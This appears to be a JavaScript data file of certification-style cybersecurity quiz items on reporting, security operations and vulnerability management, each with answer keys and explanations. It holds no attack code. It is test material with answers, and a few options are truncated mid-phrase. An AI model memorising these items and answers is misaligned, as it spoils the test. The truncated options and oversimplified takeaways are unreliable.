    {q:"A security program has: MTTD = 4 days, MTTR = 2 hours, False Positive Rate = 45%, True Positive Rate = 65%. A consultant says the 2-hour MTTR is excellent but the program has a critical weakness. What is it?",cat:"Reporting & Communication",opts:["MTTR is too slow","True positive rate is not relevant","MTTD of 4 days is the critical weakness","The false positive rate is fine"],ans:2,why:"The sequence matters: detect → respond → remediate. A 4-day MTTD means attackers have 4 days (96 hours) to move freely. Even with 2-hour MTTR, by detection time, the damage is done. Also: 45% FPR means nearly half of analyst effort is wasted, and 65% TPR means 35% of real threats go undetected.",ww:["2-hour MTTR is genuinely good — but it doesn't compensate for 4-day detection gap.","TPR of 65% means 35% of real threats are missed — very relevant.","","45% FPR is very high — but MTTD is the more critical gap."],key:"4-day MTTD = 4 days of undetected attacker activity. Fast response is irrelevant if detection is too slow."},
    {q:"A board member asks: 'We spent $5M on security last year and still got breached. What did we get for our money?' How should the CISO answer to demonstrate program value while being honest about the breach?",cat:"Reporting & Communication",opts:["Apologize for the breach and request more","Claim the $5M prevented worse outcomes","Present: what the breach cost vs. what was","Request an immediate budget increase"],ans:2,why:"Security ROI is not binary (breach = failure). Present: number of incidents detected and stopped, cost comparison to uncontrolled breach, specific controls that limited this breach's impact, and what additional investment would address remaining gaps. Honest, business-value focused.",ww:["Apology without business context fails to make the case for continued investment.","Claiming unquantified 'prevented worse outcomes' without data is unconvincing.","","Budget requests without demonstrating value from existing investment are not compelling."],key:"Security ROI = risk reduction, not breach absence. Present: incidents stopped + cost comparison + gap analysis + roadmap."}
  ],
  "cs3_security_ops_d4": [
    {q:"File structure knowledge in security operations helps analysts because:",cat:"Security Operations",opts:["It speeds up network traffic","Knowing where OS files should reside helps identify malicious files placed in unusual locations","It replaces SIEM functionality","It automates patching"],ans:1,why:"Understanding normal file structure (e.g., Windows executables in System32, Linux configs in /etc/) helps analysts spot malicious files placed in unusual directories as part of attacker persistence.",ww:["File structure is not related to network speed.","","File structure knowledge complements SIEM — not replaces it.","Patching is a separate process."],key:"Know normal file locations to spot misplaced malicious files. Attacker persistence often abuses unusual paths."},
    {q:"Virtualization in security operations allows organizations to:",cat:"Security Operations",opts:["Eliminate all hardware costs","Run multiple isolated OS instances on a single physical host, enabling sandboxing and rapid deployment","Replace firewalls","Eliminate the need for encryption"],ans:1,why:"Virtualization enables multiple isolated operating system instances on one physical host — used for sandboxing malware, rapid lab deployment, and isolating compromised systems.",ww:["Virtualization reduces but doesn't eliminate hardware costs.","","Firewalls are still required in virtual environments.","Encryption is separate from virtualization."],key:"Virtualization = multiple isolated OS instances on one host. Key for sandboxing and rapid IR deployment."},
    {q:"Unusual traffic spikes on the network should be investigated because they may indicate:",cat:"Security Operations",opts:["Normal business growth","DDoS attacks, data exfiltration, or malware C2 communication generating abnormal volume","Routine software updates","Standard database backups"],ans:1,why:"Unexpected traffic volume spikes can indicate active DDoS participation, bulk data exfiltration, or high-volume C2 communication — all requiring immediate investigation.",ww:["Business growth causes gradual expected increases — spikes are sudden and unexplained.","","Updates are scheduled and predictable.","Backups have known schedules and destinations."],key:"Traffic spikes = investigate for DDoS, exfiltration, or C2. Sudden unexplained volume changes are red flags."},
    {q:"Scans and sweeps detected on the network indicate:",cat:"Security Operations",opts:["Normal network management","An attacker performing reconnaissance to discover hosts, open ports, and services before attacking","Routine SIEM log collection","Standard DNS resolution"],ans:1,why:"Network scans and sweeps are classic pre-attack reconnaissance — mapping the environment to identify potential targets, open services, and attack paths.",ww:["Legitimate network management scans are scheduled and documented.","","SIEM collects logs — it does not perform port scans.","DNS resolution generates specific lookup traffic — not sweeps."],key:"Scans/sweeps = attacker reconnaissance. Identify targets and attack paths before exploitation."},
    {q:"Processor consumption anomalies on an endpoint may indicate:",cat:"Security Operations",opts:["Normal application usage","Cryptomining malware, resource-intensive malware, or denial of service conditions consuming unexpected CPU","Standard OS updates","Routine database queries"],ans:1,why:"Unexpected CPU spikes on endpoints often indicate cryptomining malware monetizing compromised systems, or other resource-intensive malware running background processes.",ww:["Normal usage is predictable and documented.","","OS updates cause temporary spikes at known times.","Database queries create predictable patterns."],key:"CPU spikes = cryptominer, malware, or DoS condition. Investigate unusual processes consuming CPU."},
    {q:"Malicious processes on a host are identified by:",cat:"Security Operations",opts:["Checking the desktop wallpaper","Comparing running processes against a known-good baseline and investigating unknown or suspicious process names, paths, and parent relationships","Only running antivirus","Checking disk space"],ans:1,why:"Malicious process detection requires comparing running processes to known-good baselines — investigating unexpected process names, unusual executable paths, suspicious parent-child relationships, and network connections.",ww:["Wallpaper is irrelevant to process analysis.","","AV alone misses fileless and novel malware.","Disk space is a separate indicator."],key:"Malicious processes: compare to baseline, check paths, parent relationships, and network connections."},
    {q:"Unauthorized changes on a system are detected using:",cat:"Security Operations",opts:["Manual inspection every year","File Integrity Monitoring (FIM) tools that alert on unexpected modifications to critical files, configurations, and registry entries","Only antivirus scans","Network packet capture"],ans:1,why:"FIM tools continuously monitor critical files, configurations, and registry entries — alerting when unexpected changes occur, which may indicate malware installation, attacker persistence, or insider threat activity.",ww:["Annual manual inspection misses real-time changes.","","AV misses configuration changes and registry modifications.","Packet capture monitors network — not local file changes."],key:"FIM = detect unauthorized changes to files, configs, and registry in real time."},
    {q:"Unauthorized privileges on a system indicate:",cat:"Security Operations",opts:["A routine IT task","An attacker or insider threat has escalated privileges beyond their authorized level, potentially enabling full system compromise","A normal group policy update","A software installation"],ans:1,why:"Unauthorized privilege escalation means an account has gained permissions it should not have — enabling attackers to access sensitive data, disable security controls, or move laterally with elevated rights.",ww:["IT tasks are documented and authorized.","","Group policy updates are administrative and documented.","Software installations don't grant unauthorized privileges."],key:"Unauthorized privileges = privilege escalation. Account has more access than authorized. Immediate investigation required."},
    {q:"Abnormal OS process behavior includes:",cat:"Security Operations",opts:["Normal scheduled task execution","System processes like svchost.exe initiating outbound internet connections, spawning unexpected child processes, or running from non-standard paths","Standard application launches","Routine print jobs"],ans:1,why:"Core OS processes have predictable behavior — svchost.exe spawns from services.exe and doesn't make direct internet connections. Deviations indicate process injection, hollowing, or masquerading.",ww:["Scheduled tasks are documented and expected.","","Standard applications have documented behavior.","Print jobs are normal user activity."],key:"Abnormal OS process = wrong parent, unexpected network connection, or non-standard path. Investigate immediately."},
    {q:"Registry changes or anomalies are significant because:",cat:"Security Operations",opts:["Registry is only used for system fonts","Attackers commonly modify registry Run keys and other entries to establish persistence, disable security controls, or store malware components","Registry is read-only","Registry changes are always benign"],ans:1,why:"The Windows Registry contains critical system configuration — attackers modify Run keys for persistence, disable Windows Defender through policy keys, and store encoded payloads in registry values.",ww:["Registry controls far more than fonts — it manages all Windows configuration.","","Registry is readable and writable by privileged processes.","Unexpected registry changes are a primary malware indicator."],key:"Registry changes = check Run keys, security policy keys, and unusual value additions for attacker persistence."},
    {q:"Anomalous application activity that should trigger investigation includes:",cat:"Security Operations",opts:["Normal user login","Applications performing actions outside their normal function — a PDF reader making network connections, or a text editor spawning command shells","Standard file operations","Routine database queries"],ans:1,why:"Applications have expected behavior profiles — deviations like a document reader spawning shells, making network connections, or accessing system files indicate exploitation via malicious documents or code injection.",ww:["Normal logins are expected — anomalous behavior is about unexpected actions.","","Standard file operations are expected application behavior.","Database queries are normal for database applications."],key:"Anomalous app behavior: PDF readers spawning shells, Office docs making network connections = exploit indicator."},
    {q:"Introduction of new accounts on a system may indicate:",cat:"Security Operations",opts:["Normal HR onboarding","An attacker creating backdoor accounts for persistent access, or an insider threat adding unauthorized accounts","Standard OS maintenance","A software update"],ans:1,why:"Unexpected new user accounts — especially administrator accounts created outside normal HR processes — are a classic attacker persistence technique and insider threat indicator.",ww:["HR onboarding creates accounts through documented processes.","","OS maintenance doesn't create new user accounts.","Software updates don't create user accounts."],key:"New accounts outside normal process = attacker backdoor or insider threat. Monitor account creation events."},
    {q:"Unexpected output from applications or systems may indicate:",cat:"Security Operations",opts:["Normal debugging information","Error messages revealing stack traces, SQL queries, or internal paths that expose attack surface — or malware output indicating compromise","Standard logging","Normal user notifications"],ans:1,why:"Unexpected application output can reveal exploitation (verbose error messages exposing internals) or indicate compromised systems generating unusual output such as ransomware notes or attacker messages.",ww:["Normal debug output is controlled and expected in dev environments.","","Standard logging is expected and monitored.","Normal notifications are part of expected application behavior."],key:"Unexpected output = verbose errors exposing internals, or malware-generated output. Investigate the source."},
    {q:"Unexpected outbound communication from a host indicates:",cat:"Security Operations",opts:["Normal software updates","Malware beaconing to C2 infrastructure, data exfiltration, or a compromised host participating in botnet activity","Standard cloud sync","Normal email traffic"],ans:1,why:"Outbound connections to unknown IPs, unusual domains, or non-standard ports from hosts that should not be initiating such connections indicate malware C2, exfiltration, or botnet participation.",ww:["Software updates use known vendor domains and scheduled times.","","Cloud sync uses known service endpoints.","Email traffic goes through known mail servers."],key:"Unexpected outbound communication = C2 beacon, exfiltration, or botnet. Investigate destination and payload."},
    {q:"Service interruption as a malicious activity indicator suggests:",cat:"Security Operations",opts:["Normal maintenance downtime","An attacker deliberately disrupting services as part of a destructive attack, ransomware encryption, or wiper malware","Standard patch deployment","Routine system restart"],ans:1,why:"Sudden service interruptions outside maintenance windows may indicate ransomware encrypting files, destructive wiper malware, or an attacker deliberately disrupting operations as part of an attack.",ww:["Maintenance downtime is scheduled and communicated.","","Patch deployment causes expected brief interruptions at known times.","Routine restarts are scheduled and documented."],key:"Unexpected service interruption = ransomware, wiper malware, or deliberate sabotage. Trigger IR immediately."}
  ],
  "cs3_security_ops_e5": [
    {q:"tcpdump is used for:",cat:"Security Operations",opts:["Scanning for vulnerabilities","Command-line packet capture and analysis — capturing raw network traffic to a file for later analysis or displaying it in real time","Managing firewall rules","User account management"],ans:1,why:"tcpdump is a powerful command-line packet capture tool that captures raw network traffic — used for network troubleshooting, incident investigation, and capturing evidence of malicious network activity.",ww:["Vulnerability scanning uses Nessus, OpenVAS — not tcpdump.","","Firewall rules are managed through firewall management interfaces.","User accounts are managed through OS tools."],key:"tcpdump = command-line packet capture. Use for IR evidence collection and network analysis without a GUI."},
    {q:"AbuseIPDB is used by security analysts to:",cat:"Security Operations",opts:["Scan endpoints for malware","Check IP addresses against a community database of known malicious IPs reported for abuse, spam, and attacks","Perform packet capture","Manage vulnerability patches"],ans:1,why:"AbuseIPDB is a community-driven threat intelligence database where analysts can query IP addresses to see if they have been reported for malicious activity — useful for investigating suspicious network connections.",ww:["Endpoint malware scanning uses EDR/AV tools.","","Packet capture uses Wireshark or tcpdump.","Vulnerability patching uses patch management tools."],key:"AbuseIPDB = community IP reputation database. Check suspicious IPs against reports of abuse and attacks."},
    {q:"Cuckoo Sandbox differs from Joe Sandbox in that:",cat:"Security Operations",opts:["They are identical tools","Cuckoo is open-source and self-hosted while Joe Sandbox is a commercial cloud-based service — both perform dynamic malware analysis","Cuckoo only analyzes PDFs","Joe Sandbox only runs on Windows"],ans:1,why:"Cuckoo Sandbox is an open-source, self-hosted dynamic analysis platform that organizations can run internally. Joe Sandbox is a commercial service with cloud analysis capabilities. Both execute suspicious files and observe behavior.",ww:["They have different deployment models and costs.","","Both analyze executables, documents, URLs, and more.","Both support multiple operating systems."],key:"Cuckoo = open-source self-hosted sandbox. Joe Sandbox = commercial cloud service. Both = dynamic malware analysis."},
    {q:"Email header analysis during phishing investigation reveals:",cat:"Security Operations",opts:["The email body text only","Originating IP, relay hops, SPF/DKIM/DMARC authentication results, and timestamps showing the actual email routing path","The recipient's password","Network firewall rules"],ans:1,why:"Email headers contain the complete delivery chain — originating IP address, every relay hop, authentication check results (SPF/DKIM/DMARC pass/fail), and timestamps that reveal the true source of a phishing email.",ww:["Body analysis is separate — headers reveal routing and authentication.","","Email headers don't contain passwords.","Firewall rules are separate from email analysis."],key:"Email headers = originating IP + relay hops + SPF/DKIM/DMARC results. Reveals true sender past spoofed display names."},
    {q:"Email impersonation attacks are identified by:",cat:"Security Operations",opts:["Checking only the display name","Comparing the display name against the actual sending email address and domain, and checking SPF/DKIM/DMARC alignment","Only checking for spelling errors","Checking the email subject line"],ans:1,why:"Impersonation attacks use display names that look legitimate (CEO Name) while the actual sending address is a different domain. SPF, DKIM, and DMARC check that the sending domain is authorized to send on behalf of the displayed domain.",ww:["Display names are trivially spoofed — always verify the actual sending address.","","Spelling errors may indicate phishing but aren't the primary indicator of impersonation.","Subject lines can be anything — header and authentication checks are definitive."],key:"Email impersonation: display name ≠ actual address. SPF/DKIM/DMARC check domain authorization."},
    {q:"SPF (Sender Policy Framework) works by:",cat:"Security Operations",opts:["Encrypting email content","Publishing DNS records that specify which mail servers are authorized to send email on behalf of a domain — receiving servers check these records","Scanning emails for malware","Archiving all sent emails"],ans:1,why:"SPF records in DNS list the IP addresses and mail servers authorized to send email for a domain. Receiving mail servers check the SPF record against the actual sending server — if they don't match, the email may be spoofed.",ww:["SPF is authentication — not encryption. S/MIME and PGP encrypt content.","","Malware scanning is a separate control.","Email archiving is a separate compliance function."],key:"SPF = DNS record listing authorized sending servers. Prevents domain spoofing by verifying sender IP against DNS."},
    {q:"Embedded links in phishing emails are obfuscated to:",cat:"Security Operations",opts:["Improve email loading speed","Hide the true malicious destination from victims and email security filters using URL shorteners, lookalike characters, or redirect chains","Comply with email standards","Reduce email file size"],ans:1,why:"Attackers obfuscate malicious URLs using URL shorteners, unicode lookalike characters, redirect chains, and URL encoding to prevent victims from recognizing the destination and bypass email security filters.",ww:["URL obfuscation doesn't affect loading speed.","","Email standards don't require URL obfuscation.","Obfuscation doesn't reduce file size."],key:"Obfuscated links = hide malicious destination. Always expand and check URLs before clicking."},
    {q:"Regular expressions (regex) in security operations are used to:",cat:"Security Operations",opts:["Encrypt data","Create pattern-matching rules for detecting malicious strings in logs, files, and network traffic — used in SIEM rules, IDS signatures, and DLP policies","Replace firewalls","Generate passwords"],ans:1,why:"Regular expressions define flexible pattern-matching rules — SIEM correlation rules use regex to identify malicious patterns in log data, IDS uses them for signature matching, and DLP uses them to identify sensitive data patterns.",ww:["Regex is pattern matching — not encryption.","","Regex complements firewall rules — it doesn't replace them.","Password generation uses cryptographic random functions — not regex."],key:"Regex = pattern matching for SIEM rules, IDS signatures, DLP policies. Find malicious strings in logs and traffic."},
    {q:"Relevancy as a threat intelligence confidence factor means:",cat:"Security Operations",opts:["The intelligence was published recently","The intelligence applies to the organization's specific industry, technology stack, and threat landscape","The intelligence comes from a government source","The intelligence has many sources"],ans:1,why:"Relevant threat intelligence specifically applies to the organization's environment — a financial sector organization should prioritize intelligence about threats targeting financial institutions over generic threats.",ww:["Recency is the timeliness factor — relevancy is about applicability.","","Government source is a collection method — not a relevancy measure.","Number of sources relates to accuracy — not relevancy."],key:"Relevancy = does this intelligence apply to YOUR organization? Industry + technology + geography specific."},
    {q:"Threat intelligence from blogs, forums, and government bulletins are examples of:",cat:"Security Operations",opts:["Closed source intelligence","Open source intelligence (OSINT) — publicly available information that can be collected without special access or payment","Classified intelligence","Internal threat intelligence"],ans:1,why:"Open source intelligence (OSINT) includes any publicly available information — security blogs, researcher forums, government security bulletins (CISA, NCSC), academic papers, and social media discussions.",ww:["Closed source requires payment or special access — OSINT is free and public.","","Classified intelligence requires government security clearances.","Internal intelligence comes from the organization's own systems and incidents."],key:"OSINT = publicly available intelligence. Blogs + forums + government bulletins + social media = open source."},
    {q:"Information sharing organizations in threat intelligence allow:",cat:"Security Operations",opts:["Only government agencies to share data","Organizations across sectors to share threat indicators, TTPs, and incident data in trusted communities — examples include ISACs (Information Sharing and Analysis Centers)","Only paid subscribers to receive data","Only technical staff to participate"],ans:1,why:"ISACs and ISAOs facilitate trusted threat intelligence sharing between organizations in the same sector — financial, healthcare, energy — sharing IoCs, TTPs, and incident data to improve collective defense.",ww:["ISACs include both government and private sector organizations.","","Many sharing organizations have free membership tiers.","Sharing communities include executive, legal, and technical participants."],key:"ISACs = sector-specific threat intelligence sharing. Financial, healthcare, energy sectors share IoCs and TTPs."},
    {q:"IOC analysis in threat hunting involves:",cat:"Security Operations",opts:["Only collecting IoCs from feeds","Evaluating collected IoCs for quality, relevance, and reliability — determining confidence levels, expiry, and whether they apply to the organization's environment before acting on them","Automatically blocking all IoCs","Only reporting IoCs to management"],ans:1,why:"IoC analysis evaluates the quality of collected indicators — assessing source reliability, staleness, applicability to the environment, and false positive risk before deploying them in detection rules.",ww:["Collection is a separate phase — analysis evaluates what was collected.","","Automatic blocking of all IoCs without analysis causes false positives.","Analysis drives technical action — not just reporting."],key:"IOC analysis = evaluate quality, relevance, and reliability before deploying in detection rules."},
    {q:"Threat hunting focused on configurations and misconfigurations targets:",cat:"Security Operations",opts:["Only new systems","Systems with security settings that deviate from baseline — overly permissive firewall rules, disabled security controls, or misconfigured authentication that attackers may exploit","Only internet-facing systems","Only Windows systems"],ans:1,why:"Misconfiguration hunting proactively looks for security gaps that attackers scan for — disabled logging, weak authentication settings, overly permissive access controls, or disabled endpoint protection.",ww:["Configuration hunting covers all systems — not just new ones.","","Misconfigurations exist on internal systems too.","Configuration hunting covers all platforms."],key:"Configuration hunting = find security gaps before attackers exploit them. Disabled controls + weak settings + open access."},
    {q:"Threat feed combination improves threat intelligence by:",cat:"Security Operations",opts:["Reducing the number of alerts","Aggregating IoCs from multiple sources to increase coverage, reduce blind spots, and correlate related indicators from different providers","Replacing the SIEM","Eliminating false positives"],ans:1,why:"Single threat feeds have limited coverage — combining multiple feeds (commercial, open source, government, sector-specific) provides broader indicator coverage and allows correlation of related IoCs across sources.",ww:["Combining feeds increases coverage — it may increase alert volume initially.","","Threat feeds feed into SIEM — they don't replace it.","More feeds may actually surface more true positives — rigorous analysis manages false positives."],key:"Feed combination = broader coverage + correlate related indicators. Multiple sources reduce blind spots."},
    {q:"Webhooks in security operations automation enable:",cat:"Security Operations",opts:["Physical device connections","Real-time HTTP callbacks that trigger automated workflows when specific events occur — allowing instant notification and action without polling","Manual alert review","Network packet capture"],ans:1,why:"Webhooks send real-time HTTP POST notifications to automation platforms when specific events occur — a SIEM alert can trigger a webhook that immediately starts a SOAR playbook without manual intervention.",ww:["Webhooks are software integrations — not physical connections.","","Webhooks enable automated action — not manual review.","Packet capture is network monitoring — not automation."],key:"Webhooks = real-time HTTP callbacks. Event occurs → webhook fires → automation platform triggers response."},
    {q:"Plugins in security operations tools allow:",cat:"Security Operations",opts:["Hardware upgrades","Extending tool functionality through add-on modules — vulnerability scanner plugins add new checks, SIEM plugins add new log parsers and detection rules","Replacing the base tool","Manual configuration only"],ans:1,why:"Plugins extend security tool capabilities without replacing the core platform — Nessus plugins add new vulnerability checks, SIEM plugins add log parsers for new data sources, and SOAR plugins add new integrations.",ww:["Plugins are software extensions — not hardware.","","Plugins add to the base tool — they don't replace it.","Plugins enable automated capability extension — not manual-only operation."],key:"Plugins = extend tool capability. New vuln checks, log parsers, integrations added without replacing the base platform."}
  ],

"cs3_vuln_mgmt_d4": [
    {q:"Map scans in vulnerability management are used to:",cat:"Vulnerability Management",opts:["Exploit vulnerabilities","Build a logical map of the network — identifying active hosts, IP ranges, and network topology before deeper vulnerability assessment","Generate compliance reports","Monitor user behavior"],ans:1,why:"Map scans create a network inventory — discovering which hosts are active, what IP ranges are in use, and how the network is structured — providing the foundation for targeted vulnerability scanning.",ww:["Exploitation is penetration testing — not mapping.","","Reports come after scanning — mapping is the preparation step.","User behavior monitoring is UEBA."],key:"Map scans = network topology and host inventory. Foundation step before vulnerability assessment."},
    {q:"Sensitivity levels in vulnerability scanning refer to:",cat:"Vulnerability Management",opts:["The classification level of scan results","How aggressively the scanner probes targets — high sensitivity may disrupt fragile systems like OT/ICS, medical devices, or production databases","The cost of the scanner","The scanner user's clearance level"],ans:1,why:"Scan sensitivity controls probe intensity — high sensitivity finds more vulnerabilities but risks disrupting fragile systems. OT/ICS, medical devices, and production systems often require low-sensitivity or passive-only scanning.",ww:["Sensitivity is about scan intensity — not data classification.","","Scanner cost is a procurement concern — not a sensitivity setting.","Clearance level is irrelevant to scan sensitivity."],key:"Sensitivity levels = scan aggressiveness. High = more findings but risk disruption. Reduce for OT/ICS and medical devices."},
    {q:"Internal vs. external scanning provides different perspectives because:",cat:"Vulnerability Management",opts:["They use different scan tools","Internal scans see vulnerabilities from inside the network (including internal-only systems), while external scans show what an internet-based attacker can see and target","External scanning is always more important","Internal scanning finds more vulnerabilities"],ans:1,why:"External scanning replicates what an attacker sees from the internet — exposed services and vulnerabilities on the perimeter. Internal scanning finds vulnerabilities on systems not exposed externally, including those exploitable via lateral movement.",ww:["Both can use the same tools — the difference is scan position.","","Both are important for complete coverage.","Internal scanning typically finds more vulnerabilities due to broader access."],key:"External = attacker's internet view. Internal = lateral movement risks. Both needed for complete coverage."},
    {q:"Agent-based scanning vs. agentless scanning: agents provide advantage because:",cat:"Vulnerability Management",opts:["Agents are easier to deploy","Agents scan locally on the endpoint finding vulnerabilities in locally installed software, registry settings, and configurations that network-based scanners cannot see","Agentless is always less accurate","Agents replace the need for credentialed"],ans:1,why:"Endpoint agents access local system data directly — installed software versions, registry settings, local configurations — providing deeper and more accurate results than external network scans that can only see what's network-accessible.",ww:["Agents require deployment and maintenance — they are not necessarily easier.","","Both approaches have appropriate use cases.","Agents and credentialed scanning serve similar purposes but agents provide continuous scanning."],key:"Agents = local access to software versions, registry, config. Deeper results than network-based agentless scanning."},
    {q:"Credentialed scanning differs from non-credentialed scanning because:",cat:"Vulnerability Management",opts:["Credentialed scans are faster","Credentialed scans authenticate to target systems and assess installed software, patches, and configurations that non-credentialed scans cannot see from the network","Non-credentialed scans are always more accurate","Credentialed scans only work on Windows"],ans:1,why:"With credentials, scanners log into systems and check actual patch levels, installed software versions, and configuration settings — providing far more complete results than external network probing alone.",ww:["Credentialed scans are typically slower due to deeper access.","","Credentialed scans are significantly more accurate for patch and config assessment.","Credentialed scanning works on Linux, network devices, and other systems too."],key:"Credentialed = authenticate + check actual patch levels and config. Much more complete than network-only scanning."},
    {q:"Passive vulnerability discovery monitors rather than probes because:",cat:"Security Operations",opts:["It finds more vulnerabilities","It observes existing network traffic to infer hosts, OS types, and services without sending probe packets — making it safe for sensitive systems that active scanning could disrupt","It is faster than active scanning","It requires more network bandwidth"],ans:1,why:"Passive discovery analyzes traffic already traversing the network to identify systems and services without any probe packets — ideal for OT/ICS, medical devices, or any environment where active scanning probes could cause disruption.",ww:["Passive typically finds fewer vulnerabilities but causes no disruption.","","Passive is slower — it waits for traffic to observe.","Passive uses minimal bandwidth — it only monitors existing traffic."],key:"Passive discovery = observe traffic only, no probes. Safe for OT/ICS and fragile systems."},
    {q:"Static vs. dynamic analysis in vulnerability assessment means:",cat:"Vulnerability Management",opts:["Static is slower than dynamic","Static analysis examines code or binaries without executing them while dynamic analysis tests running applications or executes files to observe behavior","Dynamic analysis is always more accurate","Static analysis only works on source code"],ans:1,why:"SAST (static) analyzes code structure without execution — finding vulnerabilities in code before deployment. DAST (dynamic) tests running applications by sending inputs and observing responses — finding runtime vulnerabilities.",ww:["Execution speed is not the distinguishing factor.","","Both approaches find different types of vulnerabilities — neither is always more accurate.","Static analysis can work on compiled binaries too — not just source code."],key:"Static = analyze code without executing. Dynamic = test running application. SAST vs DAST."},
    {q:"SCADA systems require special vulnerability scanning consideration because:",cat:"Vulnerability Management",opts:["They are easy to patch","SCADA systems control physical industrial processes — active scanning probes can crash or disrupt controllers, potentially causing physical damage or process failures","They have no vulnerabilities","They only run on Windows"],ans:1,why:"SCADA systems (Supervisory Control and Data Acquisition) control physical processes — water treatment, power grids, manufacturing. Scan probes can cause PLCs and RTUs to malfunction, potentially causing real-world physical consequences.",ww:["SCADA systems are notoriously difficult to patch due to operational requirements.","","SCADA systems have significant vulnerabilities — often running legacy software.","SCADA runs on various platforms including proprietary real-time operating systems."],key:"SCADA = controls physical processes. Active scanning can crash controllers. Use passive scanning only."},
    {q:"CIS Benchmarks are used in security baseline scanning to:",cat:"Vulnerability Management",opts:["Score vulnerability severity","Provide prescriptive hardening guidelines and configuration standards for operating systems, applications, and network devices that organizations measure against","Replace vulnerability scanners","Generate threat intelligence"],ans:1,why:"CIS (Center for Internet Security) Benchmarks define specific secure configuration standards for Windows, Linux, network devices, cloud services — comparing actual system configurations against these standards identifies deviations.",ww:["CVSS scores vulnerability severity — CIS defines configuration standards.","","CIS Benchmarks work alongside vulnerability scanners — not replacing them.","CIS Benchmarks are configuration standards — not threat intelligence."],key:"CIS Benchmarks = prescriptive configuration hardening standards. Scan systems against benchmarks to find config gaps."},
    {q:"Maltego is used for:",cat:"Vulnerability Management",opts:["Port scanning","Open source intelligence (OSINT) gathering and link analysis — visualizing relationships between domains, IPs, people, organizations, and infrastructure","Vulnerability exploitation","Packet capture"],ans:1,why:"Maltego is a visual intelligence and data mining tool that maps relationships between entities — domains, IP addresses, email addresses, organizations, social profiles — helping analysts understand attack infrastructure.",ww:["Port scanning uses Nmap or Masscan.","","Exploitation uses Metasploit — Maltego is for intelligence gathering.","Packet capture uses Wireshark or tcpdump."],key:"Maltego = OSINT + link analysis. Visualize relationships between domains, IPs, people, and organizations."},
    {q:"Arachni is best described as:",cat:"Vulnerability Management",opts:["A network port scanner","A web application security scanner that actively tests for XSS, SQL injection, file inclusion, and other OWASP Top 10 vulnerabilities","A malware analysis sandbox","A log correlation tool"],ans:1,why:"Arachni is a feature-rich web application security scanner that performs automated testing for common web vulnerabilities — XSS, SQL injection, CSRF, file inclusion — providing detailed vulnerability reports.",ww:["Port scanning uses Nmap — Arachni focuses on web application vulnerabilities.","","Malware sandboxes execute malicious files — Arachni tests web applications.","Log correlation is SIEM functionality."],key:"Arachni = web application vulnerability scanner. Tests for OWASP Top 10 including XSS, SQLi, file inclusion."},
    {q:"OpenVAS differs from Nessus in that:",cat:"Vulnerability Management",opts:["OpenVAS is faster","OpenVAS is a fully open-source vulnerability scanner maintained by the community while Nessus is a commercial product with a free limited version","OpenVAS only scans Linux","Nessus is open-source"],ans:1,why:"OpenVAS (Greenbone Vulnerability Manager) is fully open-source and free — maintained by the security community. Nessus is a commercial product from Tenable with a limited free version (Nessus Essentials).",ww:["Speed varies by configuration — not an inherent difference.","","OpenVAS scans all platforms — not just Linux.","Nessus is commercial — OpenVAS is open-source."],key:"OpenVAS = open-source free vulnerability scanner. Nessus = commercial (free limited version). Both scan broadly."},
